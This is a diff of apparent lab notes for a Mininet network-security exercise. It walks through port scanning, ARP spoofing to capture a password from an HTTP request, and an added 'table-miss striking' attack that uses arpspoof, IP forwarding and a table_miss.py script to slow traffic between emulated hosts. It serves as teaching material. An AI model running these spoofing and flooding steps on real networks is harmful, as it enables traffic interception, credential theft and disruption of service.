@@ -8,6 +8,7 @@ sh deploy.sh
 # port scanning
 attacker nmap -p 80,443 10.0.0.1
 
+
 # ARP Spoofing
 # mislead the host into thinking that the attacker is the other host.
 # 1) test the arp_spoofing script
@@ -48,3 +49,25 @@ sudo python3 arp_spoof.py 10.0.0.1 10.0.0.2
 # in h2
 curl http://10.0.0.1:81/index.html
 # in attacker(1), we see the password
+
+
+# Table-miss Striking Attack
+# in mininet :
+xterm h1 h2 attacker attacker
+# in h1
+cd /tmp
+python3 -m http.server 81 &
+# in h2, we look at the mean time
+ping -c5 10.0.0.1 
+# or ping -c 0.2 10.0.0.1 for a short time
+time curl -o /dev/null http://10.0.0.1:81/index.html
+# in attacker(1)
+sysctl -w net.ipv4.ip_forward=1
+arpspoof -i attacker-eth0 -t 10.0.0.1 10.0.0.2 &
+# in attacker(2)
+python3 table_miss.py
+# in h2, we look at the mean time again but with the attack ongoing
+ping -c5 10.0.0.1 
+time curl -o /dev/null http://10.0.0.1:81/index.html
+# we compare the mean time and conclude that the attack is successful
+# if the results are not that different, we can try downloading a bigger file in h2.
